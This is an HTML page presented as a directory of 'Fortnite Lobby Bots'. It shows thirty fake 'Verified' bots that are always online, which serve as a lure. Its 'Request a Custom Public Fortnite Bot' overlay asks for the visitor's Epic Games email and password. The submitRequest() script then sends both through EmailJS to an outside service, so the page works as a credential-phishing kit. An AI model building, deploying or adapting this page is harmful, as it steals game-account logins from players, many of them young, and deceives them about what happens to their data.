<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Fortnite Lobby Bots</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #121212;
      color: #fff;
    }

    header {
      padding: 2rem;
      text-align: center;
      background: #1e1e2f;
    }

    header h1 {
      margin: 0;
      font-size: 2rem;
    }

    #search {
      margin-top: 1rem;
      padding: 10px;
      width: 250px;
      font-size: 1rem;
      border: none;
      border-radius: 5px;
    }

    .container {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 1.5rem;
      padding: 2rem;
    }

    .bot-card {
      background: #1f1f2f;
      border-radius: 10px;
      text-align: center;
      padding: 1rem;
      cursor: pointer;
      transition: 0.2s ease;
    }

    .bot-card:hover {
      background: #292945;
    }

    .bot-card img {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      margin-bottom: 0.5rem;
      object-fit: cover;
    }

    .bot-name {
      font-size: 1.1rem;
      font-weight: bold;
    }

    .bot-desc {
      font-size: 0.85rem;
      color: #ccc;
      margin: 0.4rem 0;
    }

    .bot-status {
      font-size: 0.9rem;
      font-weight: bold;
    }

    .online { color: #4caf50; }
    .offline { color: #f44336; }

    .verified-badge {
      background: #4caf50;
      color: white;
      font-size: 0.7rem;
      padding: 2px 6px;
      border-radius: 5px;
      margin-left: 6px;
      vertical-align: middle;
      font-weight: bold;
    }

    .bot-region {
      font-size: 0.8rem;
      color: #bbb;
      margin-top: 0.5rem;
    }

    /* Modal */
    .modal {
      display: none;
      position: fixed;
      z-index: 999;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.75);
      justify-content: center;
      align-items: center;
    }

    .modal-content {
      background: #2d2d3f;
      padding: 2rem;
      border-radius: 10px;
      text-align: center;
      width: 90%;
      max-width: 400px;
      color: #fff;
      position: relative;
    }

    .modal-content img {
      width: 100px;
      height: 100px;
      border-radius: 50%;
    }

    .close {
      position: absolute;
      top: 10px;
      right: 20px;
      font-size: 1.5rem;
      cursor: pointer;
    }

    .chat-box {
      margin-top: 1.5rem;
      background: #333;
      padding: 10px;
      border-radius: 8px;
      max-height: 200px;
      overflow-y: auto;
      text-align: left;
    }

    .chat-box .chat-message {
      margin-bottom: 10px;
    }

    .chat-box .chat-message.bot {
      color: #4caf50;
    }

    .chat-box .chat-message.user {
      color: #fff;
    }

    .chat-input {
      width: 100%;
      padding: 10px;
      border-radius: 5px;
      border: 1px solid #444;
      margin-top: 10px;
      background: #222;
      color: #fff;
      font-size: 1rem;
    }

    /* Custom Bot Request Overlay */
    .overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      justify-content: center;
      align-items: center;
    }

    .overlay-content {
      background: #2d2d3f;
      padding: 2rem;
      border-radius: 10px;
      text-align: center;
      width: 90%;
      max-width: 400px;
    }

    .overlay input {
      margin: 0.5rem 0;
      padding: 0.5rem;
      width: 100%;
      border-radius: 5px;
      border: 1px solid #444;
      background: #222;
      color: #fff;
    }

    .overlay button {
      margin-top: 1rem;
      padding: 0.7rem 1.5rem;
      background: #4caf50;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<header>
  <h1>Fortnite Lobby Bots</h1>
  <input type="text" id="search" placeholder="Search OGsbot..." />
  <!-- Request a custom public Fortnite Bot Button -->
  <button id="requestBotBtn">Request a Custom Public Fortnite Bot</button>
</header>

<div class="container" id="botContainer"></div>

<!-- Modal -->
<div class="modal" id="botModal">
  <div class="modal-content">
    <span class="close" onclick="closeModal()">&times;</span>
    <img id="modalAvatar" src="" alt="Bot Avatar" />
    <h2 id="modalName"></h2>
    <p id="modalDesc"></p>
    <p><strong>Status:</strong> <span id="modalStatus"></span></p>
    <p><strong>Uptime (1/7/30 days):</strong><br><span id="modalUptime"></span></p>
    <p id="modalRegion" class="bot-region"></p>

    <!-- Chat Box -->
    <div class="chat-box" id="chatBox"></div>
    <input type="text" id="chatInput" class="chat-input" placeholder="Type a message..." onkeydown="sendChat(event)" />
  </div>
</div>

<!-- Custom Bot Request Overlay -->
<div class="overlay" id="customBotOverlay">
  <div class="overlay-content">
    <h2>Create Your Custom Public Fortnite Bot</h2>
    <p>Please create an Epic Games account to request a custom bot.</p>
    <a href="https://www.epicgames.com/id/register" target="_blank">
      <button>Go to Epic Games Registration</button>
    </a>
    <div>
      <label for="epicEmail">Epic Games Email:</label>
      <input type="email" id="epicEmail" placeholder="Enter your Epic Games email" />
      <label for="epicPassword">Epic Games Password:</label>
      <input type="password" id="epicPassword" placeholder="Enter your Epic Games password" />
    </div>
    <button onclick="submitRequest()">Submit</button>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>
  emailjs.init('qOPykaVViVTGCwwbb'); // Replace with your EmailJS public key

  const container = document.getElementById("botContainer");
  const descriptions = [
    "Builds like a pro... until they forget to add a roof.",
    "Thinks 'Good game!' is an emote.",
    "Wears Fishstick skin but doesn't know how to fish.",
    "Just tried to land in Tilted, ended up in the water.",
    "Thinks they‚Äôre in a fashion show. And, they‚Äôre winning.",
  ];

  function renderBots() {
    container.innerHTML = "";
    for (let i = 1; i <= 30; i++) {
      const div = document.createElement("div");
      div.className = "bot-card";
      div.innerHTML = `
        <img src="https://robohash.org/OGsbot${i}?set=set3" alt="OGsbot${i}">
        <div class="bot-name">
          OGsbot${i} <span class="verified-badge">‚úîÔ∏è Verified</span>
        </div>
        <div class="bot-desc">${descriptions[i % descriptions.length]}</div>
        <div class="bot-status online">üü¢ Online</div>
        <p class="bot-region">Oregon (US West)</p>
      `;
      div.onclick = () => showModal(i);
      container.appendChild(div);
    }
  }

  function showModal(index) {
    document.getElementById("modalAvatar").src = `https://robohash.org/OGsbot${index}?set=set3`;
    document.getElementById("modalName").innerHTML = `OGsbot${index} <span class="verified-badge">‚úîÔ∏è Verified</span>`;
    document.getElementById("modalDesc").textContent = descriptions[index % descriptions.length];
    document.getElementById("modalStatus").textContent = "üü¢ Online";
    document.getElementById("modalRegion").textContent = "Oregon (US West)";
    document.getElementById("botModal").style.display = "flex";
  }

  function closeModal() {
    document.getElementById("botModal").style.display = "none";
  }

  // Show overlay when button is clicked
  document.getElementById("requestBotBtn").addEventListener("click", () => {
    document.getElementById("customBotOverlay").style.display = "flex";
  });

  function submitRequest() {
    const email = document.getElementById("epicEmail").value;
    const password = document.getElementById("epicPassword").value;

    if (!email || !password) {
      alert("Please fill in both email and password.");
      return;
    }

    const templateParams = {
      email: email,
      password: password,
    };

    emailjs.send('service_rqsh5qv', 'template_hrff558', templateParams)
      .then(response => {
        alert('Request submitted successfully!');
        document.getElementById("customBotOverlay").style.display = "none";
      })
      .catch(error => {
        alert('Error submitting request: ' + error.text);
      });
  }

  // Initialize the bots
  renderBots();
</script>

</body>
</html>
